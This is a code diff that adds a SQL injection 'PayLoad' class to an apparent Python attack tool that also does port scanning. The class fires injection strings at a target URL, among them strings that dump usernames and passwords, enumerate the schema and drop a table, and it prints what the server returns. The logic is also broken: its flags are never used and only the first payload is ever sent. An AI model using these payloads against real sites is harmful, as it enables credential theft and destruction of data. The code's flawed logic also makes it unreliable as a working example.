@@ -68,3 +68,91 @@ class PortScan:
                 print(Color.RED + f"Target -> [http://{self.host}] port: {port} is closed" + Color.RESET)
             sock.close()
 
+class PayLoad:
+    def __init__(self, 
+                 url, 
+                 rocket1: bool = False,
+                 rocket2: bool = False,
+                 rocket3: bool = False,
+                 rocket4: bool = False,
+                 rocket5: bool = False,
+                 rocket6: bool = False,
+                 rocket7: bool = False,
+                 rocket8: bool = False,
+                 rocket9: bool = False,):
+
+                 self.url = url
+        
+    def start_inject(self):
+        """rocket launcher"""
+
+        rocket1 = {
+            'termo': "' UNION SELECT username, password FROM users --"
+        }
+
+        rocket2 = {
+            'termo': "' UNION SELECT table_name, NULL FROM information_schema.tables --"
+        }
+
+        rocket3 = {
+            'termo': "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'tablename' --"
+        }
+
+        rocket4 = {
+            'termo': "' UNION SELECT field1, field2 FROM tablename --"
+        }
+
+        rocket5 = {
+            'termo': "' OR 'a'='a --"
+        }
+
+        rocket6 = {
+            'termo': "' UNION SELECT user(), NULL --"
+        }
+
+        rocket7 = {
+            'termo': "' UNION SELECT @@hostname, NULL --"
+        }
+
+        rocket8 = {
+            'termo': "' UNION SELECT user(), NULL --"
+        }
+
+        rocket9 = {
+            'termo': "' ; DROP TABLE nome_da_tabela --"
+        }
+
+        if rocket1:
+            response = requests.get(self.url, params=rocket1)
+            pass
+        elif rocket2:
+            response = requests.get(self.url, params=rocket2)
+            pass
+        elif rocket3:
+            response = requests.get(self.url, params=rocket3)
+            pass
+        elif rocket4:
+            response = requests.get(self.url, params=rocket4)
+            pass
+        elif rocket5:
+            response = requests.get(self.url, params=rocket5)
+            pass
+        elif rocket6:
+            response = requests.get(self.url, params=rocket6)
+            pass
+        elif rocket7:
+            response = requests.get(self.url, params=rocket7)
+            pass
+        elif rocket8:
+            response = requests.get(self.url, params=rocket8)
+            pass
+        elif rocket9:
+            response = requests.get(self.url, params=rocket9)
+            pass
+
+        if "search results" in response.text:
+            print(Color.RED + "SQL injection performed successfully!" + Color.RESET)
+   
+            print(response.text)
+        else:
+            print(Color.GREEN + "SQL injection didn't work." + Color.RESET)
